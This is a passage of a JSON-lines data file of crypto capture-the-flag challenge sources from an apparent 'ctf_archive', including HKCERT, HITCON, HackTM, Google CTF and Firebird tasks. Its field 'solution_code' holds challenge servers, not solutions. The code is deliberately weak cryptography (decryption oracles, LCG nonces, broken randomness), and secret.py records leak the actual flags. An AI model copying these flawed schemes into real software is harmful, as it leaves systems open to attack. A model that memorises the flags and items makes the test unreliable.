'auth':\n                pbox, salt = s.preauth()\n                print(f'[pbox] {pbox}')\n                print(f'[salt] {base64.b64encode(salt).decode()}')\n                hashed_password = input('[hash] ')\n                if not s.auth(pbox, salt, hashed_password):\n                    raise Exception('No!')\n                print(f'[flag] {flag}')\n        except:\n            print('no way!')\n\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2020-sign-in-please\\server_files\\chall.py", "category": "crypto", "solution_code": "import base64\nimport hashlib\nimport os\nimport random\n\ndef parse_pbox(payload):\n    return list(map(int, payload[1:-1].split(',')))\n\n\ndef permutate(payload, pbox):\n    return bytes([payload[x] for x in pbox])\n\n\nclass Server:\n    def __init__(self, password):\n        assert len(password) == 16\n        self.password = password\n\n    def preauth(self):\n        pbox = list(range(20))\n        salt = os.urandom(4)\n        random.shuffle(pbox)\n        return pbox, salt\n\n    def auth(self, pbox, salt, hashed_password):\n        permutated_password = permutate(self.password + salt, pbox)\n        return hashlib.sha256(permutated_password).hexdigest() == hashed_password\n\n\nclass Client:\n    def __init__(self, password):\n        self.password = password\n\n    def spy(self, pbox, salt):\n        assert len(set(pbox)) == 20\n        assert len(salt) == 4\n        password = self.password\n        permutated_password = permutate(password + salt, pbox)\n\n        hashed_password = hashlib.sha256(permutated_password).hexdigest()\n        print(f'[hash] {hashed_password}')\n\n\ndef main():\n    password = base64.b64encode(os.urandom(12))\n    flag = os.environ.get('FLAG', 'hkcert20{***REDACTED***}')\n\n    s = Server(password)\n    c = Client(password)\n\n    for _ in range(10):\n        command = input('[cmd] ')\n        try:\n            if command == 'spy':\n                pbox = parse_pbox(input('[pbox] '))\n                salt = base64.b64decode(input('[salt] '))\n                c.spy(pbox, salt)\n            elif command == 'auth':\n                pbox, salt = s.preauth()\n                print(f'[pbox] {pbox}')\n                print(f'[salt] {base64.b64encode(salt).decode()}')\n                hashed_password = input('[hash] ')\n                if not s.auth(pbox, salt, hashed_password):\n                    raise Exception('No!')\n                print(f'[flag] {flag}')\n        except:\n            print('no way!')\n\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2020-sign-in-please\\server_files\\secret.py", "category": "crypto", "solution_code": "flag = 'hkcert20{d0_y0u_feel_s3cur3_wh3n_s19nin9_in?}'", "name": "secret"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2020-calm-down\\release_files\\chall.py", "category": "crypto", "solution_code": "import base64\nimport binascii\nimport hashlib\nimport os\nimport random\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\n\nfrom secret import message\n\nclass RSAKey:\n    def __init__(self, e, d, n):\n        self.e = e\n        self.d = d\n        self.n = n\n\n    def encrypt(self, message):\n        message = bytes_to_long(message)\n        ciphertext = pow(message, self.e, self.n)\n        return long_to_bytes(ciphertext)\n\n    def decrypt(self, ciphertext):\n        ciphertext = bytes_to_long(ciphertext)\n        message = pow(ciphertext, self.d, self.n)\n        return long_to_bytes(message)\n\n\nclass Challenge:\n    def __init__(self, message):\n        self.generate_key()\n        self.message = message\n\n    def generate_key(self):\n        key = RSA.generate(2048)\n        self.key = RSAKey(key.e, key.d, key.n)\n\n    def get_public_key(self):\n        n = base64.b64encode(long_to_bytes(self.key.n)).decode()\n        print(f'[pkey] {n}')\n\n    def get_secret_message(self):\n        ciphertext = self.key.encrypt(self.message)\n        ciphertext = base64.b64encode(ciphertext).decode()\n        print(f'[shhh] {ciphertext}')\n\n    def send(self, ciphertext):\n        ciphertext = base64.b64decode(ciphertext)\n        message = self.key.decrypt(ciphertext)\n        if message[-1:] != b'.':\n            raise Exception('Be polite. Your message should terminate with a full-stop.')\n        print('nice')\n\ndef main():\n    c = Challenge(message)\n\n    while True:\n        command = input('[cmd] ').split(' ')\n\n        try:\n            if command[0] == 'send':\n                c.send(command[1])\n            elif command[0] == 'pkey':\n                c.get_public_key()\n            elif command[0] == 'read':\n                c.get_secret_message()\n        except:\n            print('nope')\n\nif __name__ == '__main__':\n    main()", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2020-calm-down\\server_files\\chall.py", "category": "crypto", "solution_code": "import base64\nimport binascii\nimport hashlib\nimport os\nimport random\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\n\nfrom secret import message\n\nclass RSAKey:\n    def __init__(self, e, d, n):\n        self.e = e\n        self.d = d\n        self.n = n\n\n    def encrypt(self, message):\n        message = bytes_to_long(message)\n        ciphertext = pow(message, self.e, self.n)\n        return long_to_bytes(ciphertext)\n\n    def decrypt(self, ciphertext):\n        ciphertext = bytes_to_long(ciphertext)\n        message = pow(ciphertext, self.d, self.n)\n        return long_to_bytes(message)\n\n\nclass Challenge:\n    def __init__(self, message):\n        self.generate_key()\n        self.message = message\n\n    def generate_key(self):\n        key = RSA.generate(2048)\n        self.key = RSAKey(key.e, key.d, key.n)\n\n    def get_public_key(self):\n        n = base64.b64encode(long_to_bytes(self.key.n)).decode()\n        print(f'[pkey] {n}')\n\n    def get_secret_message(self):\n        ciphertext = self.key.encrypt(self.message)\n        ciphertext = base64.b64encode(ciphertext).decode()\n        print(f'[shhh] {ciphertext}')\n\n    def send(self, ciphertext):\n        ciphertext = base64.b64decode(ciphertext)\n        message = self.key.decrypt(ciphertext)\n        if message[-1:] != b'.':\n            raise Exception('Be polite. Your message should terminate with a full-stop.')\n        print('nice')\n\ndef main():\n    c = Challenge(message)\n\n    while True:\n        command = input('[cmd] ').split(' ')\n\n        try:\n            if command[0] == 'send':\n                c.send(command[1])\n            elif command[0] == 'pkey':\n                c.get_public_key()\n            elif command[0] == 'read':\n                c.get_secret_message()\n        except:\n            print('nope')\n\nif __name__ == '__main__':\n    main()", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2020-calm-down\\server_files\\secret.py", "category": "crypto", "solution_code": "message = b'Hey, congratulations on solving the challenge. But please hkcert20{c4lm_d0wn_4nd_s0lv3_th3_ch4llen9e}.'", "name": "secret"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HITCONCTF-2024-Hyper512\\release_files\\chall.py", "category": "crypto", "solution_code": "import secrets\nfrom hashlib import sha256\n\nMASK1 = 0x6D6AC812F52A212D5A0B9F3117801FD5\nMASK2 = 0xD736F40E0DED96B603F62CBE394FEF3D\nMASK3 = 0xA55746EF3955B07595ABC13B9EBEED6B\nMASK4 = 0xD670201BAC7515352A273372B2A95B23\n\n\nclass LFSR:\n    def __init__(self, n, key, mask):\n        self.n = n\n        self.state = key & ((1 << n) - 1)\n        self.mask = mask\n\n    def __call__(self):\n        b = self.state & 1\n        self.state = (self.state >> 1) | (\n            ((self.state & self.mask).bit_count() & 1) << (self.n - 1)\n        )\n        return b\n\n\nclass Cipher:\n    def __init__(self, key: int):\n        self.lfsr1 = LFSR(128, key, MASK1)\n        key >>= 128\n        self.lfsr2 = LFSR(128, key, MASK2)\n        key >>= 128\n        self.lfsr3 = LFSR(128, key, MASK3)\n        key >>= 128\n        self.lfsr4 = LFSR(128, key, MASK4)\n\n    def bit(self):\n        x = self.lfsr1() ^ self.lfsr1() ^ self.lfsr1()\n        y = self.lfsr2()\n        z = self.lfsr3() ^ self.lfsr3() ^ self.lfsr3() ^ self.lfsr3()\n        w = self.lfsr4() ^ self.lfsr4()\n        return (\n            sha256(str((3 * x + 1 * y + 4 * z + 2 * w + 3142)).encode()).digest()[0] & 1\n        )\n\n    def stream(self):\n        while True:\n            b = 0\n            for i in reversed(range(8)):\n                b |= self.bit() << i\n            yield b\n\n    def encrypt(self, pt: bytes):\n        return bytes([x ^ y for x, y in zip(pt, self.stream())])\n\n    def decrypt(self, ct: bytes):\n        return self.encrypt(ct)\n\n\nif __name__ == \"__main__\":\n    with open(\"flag.txt\", \"rb\") as f:\n        flag = f.read().strip()\n    key = secrets.randbits(512)\n    cipher = Cipher(key)\n    gift = cipher.encrypt(b\"\\x00\" * 2**12)\n    print(gift.hex())\n    ct = cipher.encrypt(flag)\n    print(ct.hex())\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HITCONCTF-2024-ECLCG\\release_files\\chall.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime\nfrom Crypto.Cipher import AES\nfrom fastecdsa.curve import secp256k1\nfrom hashlib import sha256\nfrom secrets import randbelow\n\n\nG = secp256k1.G\nq = secp256k1.q\n\n\ndef sign(d, z, k):\n    r = (k * G).x\n    s = (z + r * d) * pow(k, -1, q) % q\n    return r, s\n\n\ndef verify(P, z, r, s):\n    u1 = z * pow(s, -1, q) % q\n    u2 = r * pow(s, -1, q) % q\n    x = (u1 * G + u2 * P).x\n    return x == r\n\n\ndef lcg(a, b, p, x):\n    while True:\n        x = (a * x + b) % p\n        yield x\n\n\nmsgs = [\n    b\"https://www.youtube.com/watch?v=kv4UD4ICd_0\",\n    b\"https://www.youtube.com/watch?v=IijOKxLclxE\",\n    b\"https://www.youtube.com/watch?v=GH6akWYAtGc\",\n    b\"https://www.youtube.com/watch?v=Y3JhUFAa9bk\",\n    b\"https://www.youtube.com/watch?v=FGID8CJ1fUY\",\n    b\"https://www.youtube.com/watch?v=_BfmEjHVYwM\",\n    b\"https://www.youtube.com/watch?v=zH7wBliAhT0\",\n    b\"https://www.youtube.com/watch?v=NROQyBPX9Uo\",\n    b\"https://www.youtube.com/watch?v=ylH6VpJAoME\",\n    b\"https://www.youtube.com/watch?v=hI34Bhf5SaY\",\n    b\"https://www.youtube.com/watch?v=bef23j792eE\",\n    b\"https://www.youtube.com/watch?v=ybvXNOWX-dI\",\n    b\"https://www.youtube.com/watch?v=dt3p2HtLzDA\",\n    b\"https://www.youtube.com/watch?v=1Z4O8bKoLlU\",\n    b\"https://www.youtube.com/watch?v=S53XDR4eGy4\",\n    b\"https://www.youtube.com/watch?v=ZK64DWBQNXw\",\n    b\"https://www.youtube.com/watch?v=tLL8cqRmaNE\",\n]\n\nif __name__ == \"__main__\":\n    d = randbelow(q)\n    P = d * G\n\n    p = getPrime(0x137)\n    a, b, x = [randbelow(p) for _ in range(3)]\n    rng = lcg(a, b, p, x)\n\n    sigs = []\n    for m, k in zip(msgs, rng):\n        z = int.from_bytes(sha256(m).digest(), \"big\") % q\n        r, s = sign(d, z, k)\n        assert verify(P, z, r, s)\n        sigs.append((r, s))\n    print(f\"{sigs = }\")\n\n    with open(\"flag.txt\", \"rb\") as f:\n        flag = f.read().strip()\n    key = sha256(str(d).encode()).digest()\n    cipher = AES.new(key, AES.MODE_CTR)\n    ct = cipher.encrypt(flag)\n    nonce = cipher.nonce\n    print(f\"{ct = }\")\n    print(f\"{nonce = }\")\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HITCONCTF-2023-Share\\release_files\\server.py", "category": "crypto", "solution_code": "../server_files/server.py", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HITCONCTF-2023-Share\\server_files\\server.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\nfrom Crypto.Util.number import isPrime, getRandomRange, bytes_to_long\nfrom typing import List\nimport os, signal\n\n\nclass SecretSharing:\n    def __init__(self, p: int, n: int, secret: int):\n        self.p = p\n        self.n = n\n        self.poly = [secret] + [getRandomRange(0, self.p - 1) for _ in range(n - 1)]\n\n    def evaluate(self, x: int) -> int:\n        return (\n            sum([self.poly[i] * pow(x, i, self.p) for i in range(len(self.poly))])\n            % self.p\n        )\n\n    def get_shares(self) -> List[int]:\n        return [self.evaluate(i + 1) for i in range(self.n)]\n\n\nif __name__ == \"__main__\":\n    signal.alarm(30)\n    secret = bytes_to_long(os.urandom(32))\n    while True:\n        p = int(input(\"p = \"))\n        n = int(input(\"n = \"))\n        if isPrime(p) and int(13.37) < n < p:\n            shares = SecretSharing(p, n, secret).get_shares()\n            print(\"shares =\", shares[:-1])\n        else:\n            break\n    if int(input(\"secret = \")) == secret:\n        print(os.environ.get(\"FLAG\", \"flag{test_flag}\"))\n", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HackTMCTF2023-unrandom-DSA\\release_files\\server.py", "category": "crypto", "solution_code": "../server_files/server.py", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HackTMCTF2023-unrandom-DSA\\server_files\\server.py", "category": "crypto", "solution_code": "import os\nimport random\nimport signal\n\nsignal.alarm(600)\nflag = os.environ.get(\"FLAG\", \"FAKEFLAG{THIS_IS_FAKE}\")\n\ntry:\n    q = int(input(\"q = \"))\n    p = int(input(\"p = \"))\n    g = int(input(\"g = \"))\n    x = random.SystemRandom().randint(1, q - 1)\n    y = pow(g, x, p)\n    seed = int(input(\"What's your favorite number (hex): \"), 16)\n\n    # urandom is unrandom\n    os.urandom = random.randbytes\n\n    from Crypto.Hash import SHA256\n    from Crypto.PublicKey import DSA\n    from Crypto.Signature import DSS\n\n    random.seed(seed)\n\n    dsa = DSA.construct((y, g, p, q, x))\n    dss = DSS.new(dsa, \"fips-186-3\")\n    print(f\"{y = }\")\n    sign = bytes.fromhex(input(\"sign = \"))\n    # if verify is failed, it raises ValueError\n    dss.verify(SHA256.new(b\"sign me!\"), sign)\n    print(flag)\nexcept Exception as e:\n    print(e)\n", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HackTMCTF2023-d-phi-enc\\release_files\\chall.py", "category": "crypto", "solution_code": "import os\n\nfrom Crypto.Util.number import bytes_to_long, getStrongPrime\n\nflag = os.environ.get(\"FLAG\", \"FAKEFLAG{\" + \"A\" * 245 + \"}\").encode()\nassert len(flag) == 255\ne = 3\np = getStrongPrime(1024, e=e)\nq = getStrongPrime(1024, e=e)\nn = p * q\nphi = (p - 1) * (q - 1)\nd = pow(e, -1, phi)\nenc_d = pow(d, e, n)\nenc_phi = pow(phi, e, n)\nenc_flag = pow(bytes_to_long(flag), e, n)\nprint(f\"{n = }\")\nprint(f\"{enc_d = }\")\nprint(f\"{enc_phi = }\")\nprint(f\"{enc_flag = }\")\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HackTMCTF2023-broken-oracle\\release_files\\server.py", "category": "crypto", "solution_code": "../server_files/server.py", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HackTMCTF2023-broken-oracle\\server_files\\server.py", "category": "crypto", "solution_code": "\"\"\"\nimplementation of https://www.cs.umd.edu/~gasarch/TOPICS/miscrypto/rabinwithrecip.pdf\n\"\"\"\nimport os\nimport random\nimport signal\nfrom dataclasses import dataclass\nfrom math import gcd\nfrom typing import List, Tuple\n\nimport gmpy2\nfrom Crypto.Util.number import bytes_to_long, getPrime\n\n\n@dataclass\nclass Pubkey:\n    n: int\n    c: int\n\n\n@dataclass\nclass Privkey:\n    p: int\n    q: int\n\n\n@dataclass\nclass Enc:\n    r: int\n    s: int\n    t: int\n\n    def __repr__(self) -> str:\n        return f\"r = {self.r}\\ns = {self.s}\\nt = {self.t}\"\n\n\ndef crt(r1: int, n1: int, r2: int, n2: int) -> int:\n    g, x, y = gmpy2.gcdext(n1, n2)\n    assert g == 1\n    return int((n1 * x * r2 + n2 * y * r1) % (n1 * n2))\n\n\ndef gen_prime(pbits: int) -> int:\n    p = getPrime(pbits)\n    while True:\n        if p % 4 == 3:\n            return p\n        p = getPrime(pbits)\n\n\ndef genkey(pbits: int) -> Tuple[Pubkey, Privkey]:\n    p, q = gen_prime(pbits), gen_prime(pbits)\n    n = p * q\n    c = random.randint(0, n - 1)\n    while True:\n        if gmpy2.jacobi(c, p) == -1 and gmpy2.jacobi(c, q) == -1:\n            break\n        c = random.randint(0, n - 1)\n    pubkey = Pubkey(n=n, c=c)\n    privkey = Privkey(p=p, q=q)\n    return pubkey, privkey\n\n\ndef encrypt(m: int, pub: Pubkey) -> Enc:\n    assert 0 < m < pub.n\n    assert gcd(m, pub.n) == 1\n    r = int((m + pub.c * pow(m, -1, pub.n)) % pub.n)\n    s = int(gmpy2.jacobi(m, pub.n))\n    t = int(pub.c * pow(m, -1, pub.n) % pub.n < m)\n    enc = Enc(r=r, s=s, t=t)\n    assert s in [1, -1]\n    assert t in [0, 1]\n    return enc\n\n\ndef solve_quad(r: int, c: int, p: int) -> Tuple[int, int]:\n    \"\"\"\n    Solve x^2 - r * x + c = 0 mod p\n    See chapter 5.\n    \"\"\"\n\n    def mod(poly: List[int]) -> None:\n        \"\"\"\n        Calculate mod x^2 - r * x + c (inplace)\n        \"\"\"\n        assert len(poly) == 3\n        if poly[2] == 0:\n            return\n        poly[1] += poly[2] * r\n        poly[1] %= p\n        poly[0] -= poly[2] * c\n        poly[0] %= p\n        poly[2] = 0\n\n    def prod(poly1: List[int], poly2: List[int]) -> List[int]:\n        \"\"\"\n        Calculate poly1 * poly2 mod x^2 - r * x + c\n        \"\"\"\n        assert len(poly1) == 3 and len(poly2) == 3\n        assert poly1[2] == 0 and poly2[2] == 0\n        res = [\n            poly1[0] * poly2[0] % p,\n            (poly1[1] * poly2[0] + poly1[0] * poly2[1]) % p,\n            poly1[1] * poly2[1] % p,\n        ]\n        mod(res)\n        assert res[2] == 0\n        return res\n\n    # calculate x^exp mod (x^2 - r * x + c) in GF(p)\n    exp = (p - 1) // 2\n    res_poly = [1, 0, 0]  # = 1\n    cur_poly = [0, 1, 0]  # = x\n    while True:\n        if exp % 2 == 1:\n            res_poly = prod(res_poly, cur_poly)\n        exp //= 2\n        if exp == 0:\n            break\n        cur_poly = prod(cur_poly, cur_poly)\n\n    # I think the last equation in chapter 5 should be x^{(p-1)/2}-1 mod (x^2 - Ex + c)\n    # (This change is not related to vulnerability as far as I know)\n    a1 = -(res_poly[0] - 1) * pow(res_poly[1], -1, p) % p\n    a2 = (r - a1) % p\n    return a1, a2\n\n\ndef decrypt(enc: Enc, pub: Pubkey, priv: Privkey) -> int:\n    assert 0 <= enc.r < pub.n\n    assert enc.s in [1, -1]\n    assert enc.t in [0, 1]\n    mps = solve_quad(enc.r, pub.c, priv.p)\n    mqs = solve_quad(enc.r, pub.c, priv.q)\n    ms = []\n    for mp in mps:\n        for mq in mqs:\n            m = crt(mp, priv.p, mq, priv.q)\n            if gmpy2.jacobi(m, pub.n) == enc.s:\n                ms.append(m)\n    assert len(ms) == 2\n    m1, m2 = ms\n    if m1 < m2:\n        m1, m2 = m2, m1\n    if enc.t == 1:\n        m = m1\n    elif enc.t == 0:\n        m = m2\n    else:\n        raise ValueError\n    return m\n\n\nif __name__ == \"__main__\":\n    signal.alarm(300)\n    flag = os.environ.get(\"FLAG\", \"FAKEFLAG{THIS_IS_FAKE}\").encode()\n    pbits = 1024\n    pub, priv = genkey(pbits)\n    while len(flag) < 255:\n        flag += os.urandom(1)\n    enc_flag = encrypt(bytes_to_long(flag), pub)\n    print(\"encrypted flag:\")\n    print(enc_flag)\n    while True:\n        try:\n            r, s, t = map(int, input(\"r, s, t = \").split(\",\"))\n            enc = Enc(r=r, s=s, t=t)\n            enc_dec_enc = encrypt(decrypt(enc, pub, priv), pub)\n            print(\"decrypt(encrypt(input)):\")\n            print(enc_dec_enc)\n        except KeyboardInterrupt:\n            break\n        except Exception:\n            print(\"Something wrong...\")\n", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\googlectf2022-maybe-someday\\release_files\\chall.py", "category": "crypto", "solution_code": "#!/usr/bin/python3\n\n# Copyright 2022 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom Crypto.Util.number import getPrime as get_prime\nimport math\nimport random\nimport os\nimport hashlib\n\n# Suppose gcd(p, q) = 1. Find x such that\n#   1. 0 <= x < p * q, and\n#   2. x = a (mod p), and\n#   3. x = b (mod q).\ndef crt(a, b, p, q):\n    return (a*pow(q, -1, p)*q + b*pow(p, -1, q)*p) % (p*q)\n\ndef L(x, n):\n    return (x-1) // n\n\nclass Paillier:\n    def __init__(self):\n        p = get_prime(1024)\n        q = get_prime(1024)\n\n        n = p * q\n        Î» = (p-1) * (q-1) // math.gcd(p-1, q-1) # lcm(p-1, q-1)\n        g = random.randint(0, n-1)\n        Âµ = pow(L(pow(g, Î», n**2), n), -1, n)\n\n        self.n = n\n        self.Î» = Î»\n        self.g = g\n        self.Âµ = Âµ\n\n        self.p = p\n        self.q = q\n\n    # https://www.rfc-editor.org/rfc/rfc3447#section-7.2.1\n    def pad(self, m):\n        padding_size = 2048//8 - 3 - len(m)\n        \n        if padding_size < 8:\n            raise Exception('message too long')\n\n        random_padding = b'\\0' * padding_size\n        while b'\\0' in random_padding:\n            random_padding = os.urandom(padding_size)\n\n        return b'\\x00\\x02' + random_padding + b'\\x00' + m\n\n    def unpad(self, m):\n        if m[:2] != b'\\x00\\x02':\n            raise Exception('decryption error')\n\n        random_padding, m = m[2:].split(b'\\x00', 1)\n\n        if len(random_padding) < 8:\n            raise Exception('decryption error')\n\n        return m\n\n    def public_key(self):\n        return (self.n, self.g)\n\n    def secret_key(self):\n        return (self.Î», self.Âµ)\n\n    def encrypt(self, m):\n        g = self.g\n        n = self.n\n\n        m = self.pad(m)\n        m = int.from_bytes(m, 'big')\n\n        r = random.randint(0, n-1)\n        c = pow(g, m, n**2) * pow(r, n, n**2) % n**2\n\n        return c\n\n    def decrypt(self, c):\n        Î» = self.Î»\n        Âµ = self.Âµ\n        n = self.n\n\n        m = L(pow(c, Î», n**2), n) * Âµ % n\n        m = m.to_bytes(2048//8, 'big')\n\n        return self.unpad(m)\n\n    def fast_decrypt(self, c):\n        Î» = self.Î»\n        Âµ = self.Âµ\n        n = self.n\n        p = self.p\n        q = self.q\n\n        rp = pow(c, Î», p**2)\n        rq = pow(c, Î», q**2)\n        r = crt(rp, rq, p**2, q**2)\n        m = L(r, n) * Âµ % n\n        m = m.to_bytes(2048//8, 'big')\n\n        return self.unpad(m)\n\ndef challenge(p):\n    secret = os.urandom(2)\n    secret = hashlib.sha512(secret).hexdigest().encode()\n\n    c0 = p.encrypt(secret)\n    print(f'{c0 = }')\n\n    # # The secret has 16 bits of entropy.\n    # # Hence 16 oracle calls should be sufficient, isn't it?\n    # for _ in range(16):\n    #     c = int(input())\n    #     try:\n    #         p.decrypt(c)\n    #         print('ðŸ˜€')\n    #     except:\n    #         print('ðŸ˜¡')\n\n    # I decided to make it non-interactive to make this harder.\n    # Good news: I'll give you 25% more oracle calls to compensate, anyways.\n    cs = [int(input()) for _ in range(20)]\n    for c in cs:\n        try:\n            p.fast_decrypt(c)\n            print('ðŸ˜€')\n        except:\n            print('ðŸ˜¡')\n\n    guess = input().encode()\n\n    if guess != secret: raise Exception('incorrect guess!')\n\ndef main():\n    flag = os.environ.get('FLAG', 'CTF{***REDACTED***}')\n\n    p = Paillier()\n    n, g = p.public_key()\n    print(f'{n = }')\n    print(f'{g = }')\n\n    try:\n        # Once is happenstance. Twice is coincidence...\n        # Sixteen times is a recovery of the pseudorandom number generator.\n        for _ in range(16):\n            challenge(p)\n            print('ðŸ’¡')\n        print(f'ðŸ {flag}')\n    except:\n        print('ðŸ‘‹')\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\googlectf2022-maybe-someday\\server_files\\chall.py", "category": "crypto", "solution_code": "#!/usr/bin/python3\n\n# Copyright 2022 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom Crypto.Util.number import getPrime as get_prime\nimport math\nimport random\nimport os\nimport hashlib\n\n# Suppose gcd(p, q) = 1. Find x such that\n#   1. 0 <= x < p * q, and\n#   2. x = a (mod p), and\n#   3. x = b (mod q).\ndef crt(a, b, p, q):\n    return (a*pow(q, -1, p)*q + b*pow(p, -1, q)*p) % (p*q)\n\ndef L(x, n):\n    return (x-1) // n\n\nclass Paillier:\n    def __init__(self):\n        p = get_prime(1024)\n        q = get_prime(1024)\n\n        n = p * q\n        Î» = (p-1) * (q-1) // math.gcd(p-1, q-1) # lcm(p-1, q-1)\n        g = random.randint(0, n-1)\n        Âµ = pow(L(pow(g, Î», n**2), n), -1, n)\n\n        self.n = n\n        self.Î» = Î»\n        self.g = g\n        self.Âµ = Âµ\n\n        self.p = p\n        self.q = q\n\n    # https://www.rfc-editor.org/rfc/rfc3447#section-7.2.1\n    def pad(self, m):\n        padding_size = 2048//8 - 3 - len(m)\n        \n        if padding_size < 8:\n            raise Exception('message too long')\n\n        random_padding = b'\\0' * padding_size\n        while b'\\0' in random_padding:\n            random_padding = os.urandom(padding_size)\n\n        return b'\\x00\\x02' + random_padding + b'\\x00' + m\n\n    def unpad(self, m):\n        if m[:2] != b'\\x00\\x02':\n            raise Exception('decryption error')\n\n        random_padding, m = m[2:].split(b'\\x00', 1)\n\n        if len(random_padding) < 8:\n            raise Exception('decryption error')\n\n        return m\n\n    def public_key(self):\n        return (self.n, self.g)\n\n    def secret_key(self):\n        return (self.Î», self.Âµ)\n\n    def encrypt(self, m):\n        g = self.g\n        n = self.n\n\n        m = self.pad(m)\n        m = int.from_bytes(m, 'big')\n\n        r = random.randint(0, n-1)\n        c = pow(g, m, n**2) * pow(r, n, n**2) % n**2\n\n        return c\n\n    def decrypt(self, c):\n        Î» = self.Î»\n        Âµ = self.Âµ\n        n = self.n\n\n        m = L(pow(c, Î», n**2), n) * Âµ % n\n        m = m.to_bytes(2048//8, 'big')\n\n        return self.unpad(m)\n\n    def fast_decrypt(self, c):\n        Î» = self.Î»\n        Âµ = self.Âµ\n        n = self.n\n        p = self.p\n        q = self.q\n\n        rp = pow(c, Î», p**2)\n        rq = pow(c, Î», q**2)\n        r = crt(rp, rq, p**2, q**2)\n        m = L(r, n) * Âµ % n\n        m = m.to_bytes(2048//8, 'big')\n\n        return self.unpad(m)\n\ndef challenge(p):\n    secret = os.urandom(2)\n    secret = hashlib.sha512(secret).hexdigest().encode()\n\n    c0 = p.encrypt(secret)\n    print(f'{c0 = }')\n\n    # # The secret has 16 bits of entropy.\n    # # Hence 16 oracle calls should be sufficient, isn't it?\n    # for _ in range(16):\n    #     c = int(input())\n    #     try:\n    #         p.decrypt(c)\n    #         print('ðŸ˜€')\n    #     except:\n    #         print('ðŸ˜¡')\n\n    # I decided to make it non-interactive to make this harder.\n    # Good news: I'll give you 25% more oracle calls to compensate, anyways.\n    cs = [int(input()) for _ in range(20)]\n    for c in cs:\n        try:\n            p.fast_decrypt(c)\n            print('ðŸ˜€')\n        except:\n            print('ðŸ˜¡')\n\n    guess = input().encode()\n\n    if guess != secret: raise Exception('incorrect guess!')\n\ndef main():\n    flag = os.environ.get('FLAG', 'CTF{***REDACTED***}')\n\n    p = Paillier()\n    n, g = p.public_key()\n    print(f'{n = }')\n    print(f'{g = }')\n\n    try:\n        # Once is happenstance. Twice is coincidence...\n        # Sixteen times is a recovery of the pseudorandom number generator.\n        for _ in range(16):\n            challenge(p)\n            print('ðŸ’¡')\n        print(f'ðŸ {flag}')\n    except:\n        print('ðŸ‘‹')\n\nif __name__ == '__main__':\n    main()\n", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2022-lack-of-entropy\\release_files\\chall.py", "category": "crypto", "solution_code": "import random\nimport gmpy2\n\ne = 0x10001\n\nwith open('flag.txt', 'rb') as f:\n    m = f.read()\n    m = int.from_bytes(m, 'big')\n\nwhile True:\n    p = random.getrandbits(256)\n    q = int(gmpy2.digits(p, 3))\n\n    # Ensure that they are prime\n    if not gmpy2.is_prime(p): continue\n    if not gmpy2.is_prime(q): continue\n\n    # Ensure that d exists\n    if (p-1) % e == 0: continue\n    if (q-1) % e == 0: continue\n\n    break\n\nn = p * q\nassert 0 <= m < n\n\nc = pow(m, e, n)\n\nprint(f'{n = }')\nprint(f'{e = }')\nprint(f'{c = }')", "name": "chall"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\firebird2022-collider\\release_files\\chall.py", "category": "crypto", "solution_code": "from gmpy2 import is_prime\nimport random\nimport sys\nimport re\nimport os\n\ndef hash(m):\n    m = int.from_bytes(b'SECUREHASH_' + m, 'big')\n    return pow(g, m, p).to_bytes(256//8, 'big')\n\nif __name__ == '__main__':\n    flag = os.environ.get('FLAG', 'firebird{***REDACTED***}')\n\n    while True:\n        g = random.getrandbits(256)\n        p = random.getrandbits(256)\n        if not is_prime(p): continue\n        break\n\n    for _ in range(5):\n        m = input().strip()\n\n        if re.match(r'^[a-z]+$', m) is None:\n            print('Please be less rude.')\n            sys.exit(0) \n\n        m = m.encode()\n        h = hash(m)\n        print(f'h({m}) = {h.hex()}')\n\n        if m == b'pleasegivemetheflag':       continue\n        if h != hash(b'pleasegivemetheflag'): continue\n    \n        print(f'Congrats! {flag}')\n        sys.exit(0)\n", "name": "chall"}
